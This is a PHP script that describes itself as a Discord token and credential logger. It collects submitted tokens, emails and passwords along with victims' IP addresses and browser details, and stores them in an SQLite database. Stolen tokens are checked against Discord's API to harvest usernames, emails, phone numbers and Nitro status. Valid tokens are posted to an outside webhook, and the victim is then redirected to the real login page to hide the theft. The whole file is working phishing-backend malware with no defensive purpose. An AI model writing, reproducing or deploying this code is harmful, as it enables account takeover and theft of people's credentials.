<?php
// capture.php - Discord token/credential logger with SQLite
header('Content-Type: application/json');

// === CONFIG ===
$db_file = 'tokens.db';
$backup_webhook = 'https://discord.com/api/webhooks/YOUR_BACKUP_WEBHOOK'; // optional

// === DATABASE SETUP ===
try {
    $db = new PDO("sqlite:$db_file");
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    $db->exec("CREATE TABLE IF NOT EXISTS tokens (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        token TEXT,
        email TEXT,
        password TEXT,
        ip TEXT,
        user_agent TEXT,
        referer TEXT,
        source TEXT,
        valid INTEGER DEFAULT 0,
        username TEXT,
        discord_email TEXT,
        phone TEXT,
        nitro BOOLEAN DEFAULT 0,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
} catch (PDOException $e) {
    die(json_encode(['error' => 'DB connection failed']));
}

// === GET INPUT ===
$input = json_decode(file_get_contents('php://input'), true);
if (!$input) {
    $input = $_GET;
}

// === EXTRACT DATA ===
$token = $input['token'] ?? $input['t'] ?? null;
$email = $input['email'] ?? null;
$password = $input['password'] ?? null;
$source = $input['source'] ?? 'unknown';
$redirect = $input['redirect'] ?? 'https://discord.com/login';

// === CLIENT DETAILS ===
$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$referer = $_SERVER['HTTP_REFERER'] ?? 'direct';

// === VALIDATE TOKEN (if provided) ===
$valid = 0;
$username = null;
$discord_email = null;
$phone = null;
$nitro = 0;

if ($token) {
    $ch = curl_init('https://discord.com/api/v10/users/@me');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Authorization: $token"]);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($http_code === 200) {
        $data = json_decode($response, true);
        $valid = 1;
        $username = $data['username'] ?? null;
        $discord_email = $data['email'] ?? null;
        $phone = $data['phone'] ?? null;
        $nitro = ($data['premium_type'] ?? 0) > 0 ? 1 : 0;
    }
}

// === INSERT INTO DATABASE ===
try {
    $stmt = $db->prepare("INSERT INTO tokens 
        (token, email, password, ip, user_agent, referer, source, valid, username, discord_email, phone, nitro) 
        VALUES (:token, :email, :password, :ip, :ua, :ref, :source, :valid, :username, :discord_email, :phone, :nitro)");
    
    $stmt->execute([
        ':token' => $token,
        ':email' => $email,
        ':password' => $password,
        ':ip' => $ip,
        ':ua' => $user_agent,
        ':ref' => $referer,
        ':source' => $source,
        ':valid' => $valid,
        ':username' => $username,
        ':discord_email' => $discord_email,
        ':phone' => $phone,
        ':nitro' => $nitro
    ]);
    $id = $db->lastInsertId();
} catch (PDOException $e) {
    // Silent fail
}

// === BACKUP WEBHOOK (if valid token) ===
if ($valid && $backup_webhook) {
    $payload = [
        'content' => "**[+] NEW VALID TOKEN**\n" .
                     "User: {$username}\n" .
                     "Email: {$discord_email}\n" .
                     "Nitro: " . ($nitro ? '✅' : '❌') . "\n" .
                     "IP: {$ip}\n" .
                     "Token: `{$token}`"
    ];
    $ch = curl_init($backup_webhook);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_TIMEOUT, 2);
    curl_exec($ch);
    curl_close($ch);
}

// === RESPOND ===
if (isset($input['qr'])) {
    // QR scan request — return token if found (simulated)
    echo json_encode(['status' => 'qr_ready', 'token' => null]);
    exit;
}

if ($redirect) {
    header('Location: ' . $redirect);
    exit;
}

echo json_encode([
    'status' => 'logged',
    'id' => $id,
    'valid' => $valid,
    'username' => $username
]);
?>